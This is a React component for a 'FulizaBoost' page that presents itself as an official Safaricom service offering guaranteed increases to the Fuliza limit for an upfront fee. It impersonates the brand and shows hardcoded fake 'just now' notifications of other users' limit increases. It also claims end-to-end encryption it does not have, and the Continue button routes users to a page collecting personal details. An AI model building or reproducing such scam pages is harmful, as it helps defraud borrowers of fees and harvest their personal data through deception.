import { useState, useEffect } from "react";
import "../styles/Home.css";
import { useNavigate } from "react-router-dom";


type LimitOption = {
  amount: number;
  fee: number;
};

const limits: LimitOption[] = [
  { amount: 2000, fee: 10 },
  { amount: 2500, fee: 150 },
  { amount: 3000, fee: 190 },
  { amount: 3500, fee: 220 },
  { amount: 4000, fee: 250 },
  { amount: 5000, fee: 300 },
  { amount: 6000, fee: 350 },
  { amount: 7000, fee: 400 },
   { amount: 10000, fee: 500 },
    { amount: 15000, fee: 600 },
];

const notifications = [
  { phone: "0708****85", limit: 45000 },
  { phone: "0712****34", limit: 30000 },
  { phone: "0722****91", limit: 25000 },
  { phone: "0733****56", limit: 35000 },
  { phone: "0745****23", limit: 20000 },
  { phone: "0756****78", limit: 15000 },
  { phone: "0767****12", limit: 40000 },
  { phone: "0778****45", limit: 25000 },
  { phone: "0789****67", limit: 30000 },
  { phone: "0791****89", limit: 45000 },
];

const Home = () => {
  const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
  const [currentNotification, setCurrentNotification] = useState(notifications[0]);
  const [showNotification, setShowNotification] = useState(true);
  const navigate = useNavigate();
  
  // Change notification every 4 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      setShowNotification(false);
      
      setTimeout(() => {
        const randomIndex = Math.floor(Math.random() * notifications.length);
        setCurrentNotification(notifications[randomIndex]);
        setShowNotification(true);
      }, 300);
    }, 4000);

    return () => clearInterval(interval);
  }, []);

   const handleBadgeClick = () => {
    navigate("/login"); // or whatever route your login page is
  };

  return (
    <main className="container">
      {/* HEADER */}
      <div className="badge" onClick={handleBadgeClick}>● SAFARICOM OFFICIAL</div>

      {/* NOTIFICATION OVERLAY */}
      <div className={`notification-overlay ${showNotification ? 'show' : ''}`}>
        <div className="notification-icon">✅</div>
        <div className="notification-content">
          <strong>{currentNotification.phone}</strong> increased to Ksh {currentNotification.limit.toLocaleString()}
          <div className="notification-time">• just now</div>
        </div>
      </div>

      <h1 className="title">FulizaBoost</h1>
      <p className="subtitle">
        Instant Limit Increase • Guaranteed Approval
      </p>

      {/* INFO */}
      <div className="info-box">
        ⚡ Choose your new Fuliza limit and complete the payment to get instant
        access.
      </div>

      {/* LIMITS */}
      <h3 className="section-title">Select Your Fuliza Limit</h3>

      <div className="grid">
        {limits.map((item) => {
          const isActive = selectedAmount === item.amount;

          return (
            <div
              key={item.amount}
              className={`card ${isActive ? "active" : ""}`}
              onClick={() => setSelectedAmount(item.amount)}
            >
              <h2>Ksh {item.amount.toLocaleString()}</h2>
              <span className="fee">
                Fee: Ksh {item.fee.toLocaleString()}
              </span>
            </div>
          );
        })}
      </div>

      {/* FOOTER */}
      <div className="secure">
        🔒 VERIFIED SECURE • END-TO-END ENCRYPTED
      </div>
      
      <button
        className={`continue-btn ${selectedAmount ? "enabled" : ""}`}
        disabled={!selectedAmount}
        onClick={() => {
          const selectedLimit = limits.find(l => l.amount === selectedAmount);
          if (selectedLimit) {
            navigate("/personal-details", { state: selectedLimit });
            sessionStorage.setItem("selectedLimit", JSON.stringify(selectedLimit));
          }
        }}
      >
        Continue
      </button>
    </main>
  );
};

export default Home;